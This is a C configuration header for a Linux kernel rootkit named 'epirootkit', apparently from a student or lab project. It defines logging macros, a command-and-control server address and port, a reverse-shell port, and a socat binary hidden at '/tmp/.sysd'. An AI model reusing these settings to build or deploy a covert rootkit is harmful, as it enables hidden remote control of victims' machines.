#ifndef CONFIG_H
#define CONFIG_H

// Utils macros
#define SUCCESS 0
#define FAILURE 1

// Logs macros
#define DEBUG 1
#define DBG_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_info(fmt, ##args); 							\
		} 													\
	} while (0)

#define ERR_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_err(fmt, ##args); 							\
		} 													\
	} while (0)

// Configuration macros
#define SERVER_IP "192.168.100.2"
#define SERVER_PORT 4242
#define REVERSE_SHELL_PORT 9001
#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
#define STDOUT_FILE "/tmp/std.out"
#define STDERR_FILE "/tmp/std.err"
#define SOCAT_BINARY_PATH "/tmp/.sysd"

#define MAX_MSG_SEND_OR_RECEIVE_ERROR 5
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 1024

// Module parameters
extern char *ip;
extern int port;
extern char *message;

#endif /* CONFIG_H */